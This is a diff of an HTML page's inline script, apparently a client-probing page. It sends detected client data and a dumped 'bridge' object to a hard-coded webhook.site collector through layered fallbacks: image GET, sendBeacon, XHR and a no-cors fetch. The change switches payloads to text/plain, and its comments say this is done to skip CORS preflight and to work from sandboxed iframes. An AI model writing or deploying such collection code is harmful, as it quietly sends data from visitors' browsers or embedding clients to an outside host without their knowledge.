@@ -60,8 +60,8 @@
   /* Collector URL — inlined to avoid browser cache serving stale collector-config.js */
   var COLLECTOR_URL = "https://webhook.site/1a50d175-1bed-455a-a407-7246a26d77e9";
 </script>
-<script src="js/client-detect.js?v=6"></script>
-<script src="js/probes.js?v=6"></script>
+<script src="js/client-detect.js?v=7"></script>
+<script src="js/probes.js?v=7"></script>
 <script>
 (function() {
   "use strict";
@@ -198,23 +198,22 @@
     img.onload = img.onerror = function() { markSent("img-GET"); };
     img.src = COLLECTOR_URL + "?_b=" + encodeURIComponent(compact) + "&_t=" + Date.now();
 
-    // ── Method 2: sendBeacon (POST, works in modern browsers from sandboxed iframes) ──
+    // ── Method 2: sendBeacon POST with text/plain (no preflight, CORS-safe) ──
     if (navigator.sendBeacon) {
       try {
-        var blob = new Blob([payloadStr], { type: "application/json" });
+        var blob = new Blob([payloadStr], { type: "text/plain" });
         var queued = navigator.sendBeacon(COLLECTOR_URL, blob);
         if (queued) { markSent("sendBeacon-POST"); }
       } catch(e) { /* ignore, fall through */ }
     }
 
-    // ── Method 3: XHR with CORS (webhook.site supports CORS) ──
+    // ── Method 3: XHR text/plain (no preflight — avoids CORS 429 on rate-limited collectors) ──
     try {
       var xhr = new XMLHttpRequest();
       xhr.open("POST", COLLECTOR_URL, true);
-      xhr.setRequestHeader("Content-Type", "application/json");
+      xhr.setRequestHeader("Content-Type", "text/plain");
       xhr.onload  = function() { markSent("XHR-POST HTTP " + xhr.status); };
       xhr.onerror = function() {
-        // Final fallback: no-cors fetch
         fetch(COLLECTOR_URL, { method: "POST", headers: { "Content-Type": "text/plain" }, body: payloadStr, mode: "no-cors" })
           .then(function() { markSent("fetch-no-cors"); })
           .catch(function(e) { if (!sent) markFailed(e.message); });
@@ -285,7 +284,7 @@
       if (window.__bridgeDump && COLLECTOR_URL && COLLECTOR_URL !== "<SET-ME>") {
         var xhr2 = new XMLHttpRequest();
         xhr2.open("POST", COLLECTOR_URL + "?_media=bridge-dump&_t=" + Date.now(), true);
-        xhr2.setRequestHeader("Content-Type", "application/json");
+        xhr2.setRequestHeader("Content-Type", "text/plain");
         xhr2.send(JSON.stringify(window.__bridgeDump, null, 2));
       }
     }, 1000);
